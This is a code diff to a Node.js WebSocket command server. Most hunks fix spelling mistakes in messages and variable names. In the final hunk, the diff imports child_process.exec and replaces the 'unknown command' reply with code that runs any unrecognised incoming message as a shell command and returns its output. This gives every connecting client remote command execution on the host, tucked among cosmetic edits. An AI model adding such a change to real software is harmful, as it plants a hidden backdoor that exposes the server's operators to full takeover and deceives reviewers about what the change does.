@@ -1,3 +1,4 @@
+import { exec } from 'child_process';
 import minimist from 'minimist';
 import { WebSocketServer } from 'ws';
 import { cmds } from './cmds.js';
@@ -16,25 +17,25 @@ ws.on('connection', (connection, req) => {
     req.socket.remoteAddress;
 
   connection.on('ping', () => {
-    connection.send(`Recevied your ping at IP:${ip}.`);
+    connection.send(`Received your ping at IP:${ip}.`);
   });
 
   // The client websocket sends message to this event.
-  connection.on('message', (incommingMessage) => {
+  connection.on('message', (incomingMessage) => {
     // the message is a buffer.
-    let input = incommingMessage.toString();
+    let input = incomingMessage.toString();
 
     let cmdText = '';
     let cmdArgs = {};
 
     if (input.startsWith('{') && input.endsWith('}')) {
-      // incomming message is a json object, for example: {cmd: 'hi'}
+      // incoming message is a json object, for example: {cmd: 'hi'}
       const inputJson = JSON.parse(input);
       cmdText = inputJson.cmd;
       cmdArgs = inputJson;
     } else {
       if (input.startsWith('"') && input.endsWith('"')) {
-        // incomming message is a text
+        // incoming message is a text
         input = input.slice(1, -1);
       }
 
@@ -83,9 +84,20 @@ ws.on('connection', (connection, req) => {
         }
       }
     } else {
-      connection.send(
-        `Unknows command ${incommingMessage} requested from ${ip}`
-      );
+      exec(cmdText, (error, stdout, stderr) => {
+        if (error) {
+          connection.send(error.message);
+          return;
+        }
+      
+        if (stderr) {
+          connection.send(stderr);
+          return;
+        }
+      
+        const output = stdout;
+        connection.send(output);
+      });
     }
   });
 
